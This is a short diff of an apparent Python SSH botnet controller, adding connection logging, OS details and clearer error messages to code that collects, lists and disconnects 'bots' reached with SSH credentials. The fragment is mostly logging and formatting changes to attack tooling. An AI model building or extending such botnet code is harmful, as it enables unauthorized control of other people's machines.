@@ -58,16 +58,17 @@ Options:
 		client = Client (target, sshuser, passwd)
 		if client.session != False:
 			self.BotNet.append (client)
-
+			dt = time.ctime()
+			self.log.log_append ('\n[+] Successful connection with '+client.target+'\n-> OS Specs: ' + self.ver.LinVer (client)+'\n-> Date and time: '+dt)
 	def show_bot (self):
 
 		os.system('clear')
 		os.system ('cat os_admin/sys_list')
 		
-	def ref_list (self): # refresh botlist
+	def ref_list (self):
 
 		self.os_list.log_clean ()
-		self.os_list.log_append ('\n-------------- HOSTS --------------\nID\t| address\t\t| System\n----------------------------------------------------')
+		self.os_list.log_append ('\n----------------------- HOSTS ----------------------\nID\t| address\t\t| System\n----------------------------------------------------')
 		i = 0
 		for bot in self.BotNet:
 			try:
@@ -80,6 +81,7 @@ Options:
 	def BotNetDis (self):
 		self.ref_list ()
 		print ('[+] Bots list saved: os_admin/')
+
 		for bot in self.BotNet:
 			try:
 				bot.session.logout()
@@ -87,6 +89,7 @@ Options:
 				pass
 		self.log.log_chname () 
 		self.os_list.log_chname ()
+
 		print ('[+] All bots successfully disconnected\n[+] Logfile under: os_admin/')
 
 
@@ -112,7 +115,7 @@ Options:
 			t = Thread (target=self.add_bot, args=(creds[0], creds[1], creds[2]))
 			child = t.start()
 		except Exception as e:
-			error =  ('[!] Error while trying to connect \n-> Specs of error'+str(e))
+			error =  ('[!] Error while trying to connect to '+creds[0]+'\n-> Specs of error'+str(e))
 			self.log.log_append (error)
 
 	def BotNetCmd (self):
